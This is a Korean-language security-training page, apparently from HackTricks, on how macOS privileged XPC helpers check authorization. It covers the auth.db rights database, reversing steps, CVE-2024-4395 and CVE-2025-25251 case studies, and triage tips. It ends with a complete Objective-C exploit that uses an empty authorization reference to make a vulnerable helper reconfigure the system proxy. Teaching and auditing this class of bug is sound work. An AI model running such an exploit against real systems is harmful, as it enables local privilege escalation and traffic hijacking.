# macOS XPC 권한 부여

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC 권한

Apple은 연결하는 프로세스가 **노출된 XPC 메서드를 호출할 권한을 가지고 있는 경우** 인증하는 또 다른 방법을 제안한다.

애플리케이션이 **권한 있는 사용자로서 동작을 실행해야 할 때**, 애플리케이션 자체를 권한 있는 사용자로 실행하는 대신 보통 루트로 HelperTool을 설치하여 앱에서 호출해 해당 동작을 수행하는 XPC 서비스로 사용한다. 하지만 그 서비스를 호출하는 앱은 충분한 권한을 가져야 한다.

### ShouldAcceptNewConnection 항상 YES

예제는 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 찾을 수 있다. `App/AppDelegate.m`에서는 **HelperTool에 연결하려고 한다**. 그리고 `HelperTool/HelperTool.m`에서는 함수 **`shouldAcceptNewConnection`**가 앞서 언급한 어떤 요구 사항도 **확인하지 않는다**. 항상 YES를 반환한다:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
이 검사를 올바르게 구성하는 방법에 대한 자세한 내용은:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### 애플리케이션 권한

하지만, **HelperTool의 메서드가 호출될 때 authorization 처리가 수행됩니다**.

`App/AppDelegate.m`의 함수 **`applicationDidFinishLaunching`**는 앱이 시작된 후 빈 authorization reference를 생성합니다. 이는 항상 동작해야 합니다.\
그런 다음, `setupAuthorizationRights`를 호출하여 해당 authorization reference에 **권한을 추가**하려고 시도합니다:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`의 `setupAuthorizationRights` 함수는 인증 데이터베이스 `/var/db/auth.db`에 애플리케이션의 권한을 저장합니다. 데이터베이스에 아직 없는 권한만 추가한다는 점을 주목하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
함수 `enumerateRightsUsingBlock`은 애플리케이션의 권한을 가져오는 데 사용되며, 해당 권한들은 `commandInfo`에 정의되어 있습니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이것은 이 과정이 끝나면 `commandInfo` 내에 선언된 권한들이 `/var/db/auth.db`에 저장된다는 것을 의미합니다. 거기에서는 **각 메서드**에 대해 인증이 **필요한 경우**, **권한 이름(permission name)** 및 **`kCommandKeyAuthRightDefault`**를 찾을 수 있습니다. 후자는 **누가 이 권한을 얻을 수 있는지**를 나타냅니다.

권한에 접근할 수 있는 주체를 나타내는 다양한 범위가 있습니다. 그 중 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/))에 정의되어 있으며, 요약하면:

<table><thead><tr><th width="284.3333333333333">이름</th><th width="165">값</th><th>설명</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>누구나</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자가 admin(관리자) 그룹의 일원이어야 함</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 인증을 요구함.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 인증을 요구함. 사용자는 admin(관리자) 그룹의 일원이어야 함</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>규칙을 지정</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>권한에 대한 추가 설명을 지정</td></tr></tbody></table>

### 권한 확인

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
주의: 해당 메서드를 호출할 권한을 얻기 위한 요구사항을 **확인하려면** 함수 `authorizationRightForCommand`는 이전에 주석 처리된 객체 **`commandInfo`**만 확인합니다. 그 다음, 함수를 호출할 권한이 있는지 **확인하기 위해** **`AuthorizationCopyRights`**를 호출합니다(플래그가 사용자와의 상호작용을 허용한다는 점에 유의하세요).

이 경우 함수 `readLicenseKeyAuthorization`를 호출하기 위해 `kCommandKeyAuthRightDefault`는 `@kAuthorizationRuleClassAllow`로 정의되어 있습니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장되어 있다고 언급되었습니다. 저장된 모든 규칙은 다음 명령으로 나열할 수 있습니다:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그런 다음, 다음 명령으로 누가 해당 권한에 접근할 수 있는지 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용 권한

You can find **all the permissions configurations** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), but the combinations that won't require user interaction would be:

1. **'authenticate-user': 'false'**
- 이것은 가장 직접적인 키입니다. `false`로 설정되면 사용자가 이 권한을 얻기 위해 인증을 제공할 필요가 없음을 지정합니다.
- 이는 **아래 두 가지 중 하나와 결합되거나 사용자가 속해야 하는 그룹을 지정할 때** 사용됩니다.
2. **'allow-root': 'true'**
- 사용자가 root user로 작동하고(권한이 상승된 상태), 이 키가 `true`로 설정되어 있으면 root user는 추가 인증 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 root user 상태에 도달하려면 이미 인증이 필요하므로 대부분의 사용자에게는 "인증 없음" 시나리오는 아닙니다.
3. **'session-owner': 'true'**
- `true`로 설정되면 세션 소유자(현재 로그인한 사용자)가 자동으로 이 권한을 얻습니다. 사용자가 이미 로그인한 상태라면 추가 인증을 우회할 수 있습니다.
4. **'shared': 'true'**
- 이 키는 인증 없이 권한을 부여하지 않습니다. 대신 `true`로 설정되면 권한이 한 번 인증된 후에는 각 프로세스가 다시 인증할 필요 없이 여러 프로세스 간에 공유될 수 있음을 의미합니다. 그러나 초기 권한 부여는 여전히 `'authenticate-user': 'false'`와 같은 다른 키와 결합되지 않는 한 인증을 필요로 합니다.

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2024-4395 – Jamf Compliance Editor helper**: 감사를 실행하면 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`가 설치되고, Mach 서비스 `com.jamf.complianceeditor.helper`가 노출되며 호출자의 `AuthorizationExternalForm`이나 코드 서명을 확인하지 않고 `-executeScriptAt:arguments:then:`를 export 합니다. 사소한 익스플로잇은 `AuthorizationCreate`로 빈 참조를 만들고 `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`로 연결한 뒤 해당 메서드를 호출해 임의의 바이너리를 root로 실행시킵니다. 전체 리버싱 노트(및 PoC)는 [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)에 있습니다.
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 및 7.4.0–7.4.2는 권한 검증이 없는 privileged helper에 도달하는 조작된 XPC 메시지를 수락했습니다. helper가 자체의 privileged `AuthorizationRef`를 신뢰했기 때문에, 서비스에 메시지를 보낼 수 있는 로컬 사용자는 이를 이용해 임의의 설정 변경이나 명령을 root로 실행하도록 강제할 수 있었습니다. 자세한 내용은 [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)를 참조하세요.

#### Rapid triage tips

- 앱이 GUI와 helper를 함께 배포할 때는 두 구성요소의 code requirements를 비교(diff)하고 `shouldAcceptNewConnection`가 리스너를 `-setCodeSigningRequirement:`로 잠그는지(또는 `SecCodeCopySigningInformation`을 검증하는지) 확인하세요. 검사 누락은 일반적으로 Jamf 사례처럼 CWE-863 시나리오로 이어집니다. 빠른 확인은 다음과 같이 보입니다:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- 헬퍼가 *권한을 부여한다고 생각하는 것*과 클라이언트가 제공하는 것을 비교하라. 리버싱할 때는 `AuthorizationCopyRights`에서 중단하고 `AuthorizationRef`가 헬퍼의 자체 권한 있는 컨텍스트가 아니라 클라이언트가 제공한 `AuthorizationCreateFromExternalForm`에서 비롯되었는지 확인하라. 그렇지 않으면 위 사례들과 유사한 CWE-863 패턴을 발견한 것일 가능성이 높다.

## 권한 리버싱

### EvenBetterAuthorization 사용 여부 확인

함수 **`[HelperTool checkAuthorization:command:]`** 를 찾으면, 해당 프로세스가 앞서 언급한 권한 부여 스키마를 사용하고 있을 가능성이 높다:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

이 경우, 만약 이 함수가 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` 같은 함수를 호출한다면, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)를 사용하고 있는 것이다.

**`/var/db/auth.db`** 를 확인해서 사용자 상호작용 없이 일부 권한 있는 동작을 호출할 수 있는 권한을 얻을 수 있는지 확인하라.

### 프로토콜 통신

그 다음으로, XPC 서비스와 통신을 수립할 수 있도록 프로토콜 스키마를 찾아야 한다.

함수 **`shouldAcceptNewConnection`** 는 내보내지는 프로토콜을 나타낸다:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

이 경우, EvenBetterAuthorizationSample과 동일하다, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

사용된 프로토콜 이름을 알면, it's possible to **dump its header definition** with:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 통신을 수립하기 위해 공개된 Mach Service의 **이름**만 알면 됩니다. 이를 찾는 방법은 여러 가지가 있습니다:

- **`[HelperTool init]`**에서 Mach Service가 사용되는 것을 볼 수 있습니다:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit 예제

이 예제에서는 다음이 생성됩니다:

- 함수들이 포함된 프로토콜 정의
- 액세스를 요청하는 데 사용할 빈 auth
- XPC 서비스에 대한 연결
- 연결이 성공하면 함수 호출
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 악용된 기타 XPC 권한 헬퍼

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 참고자료

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
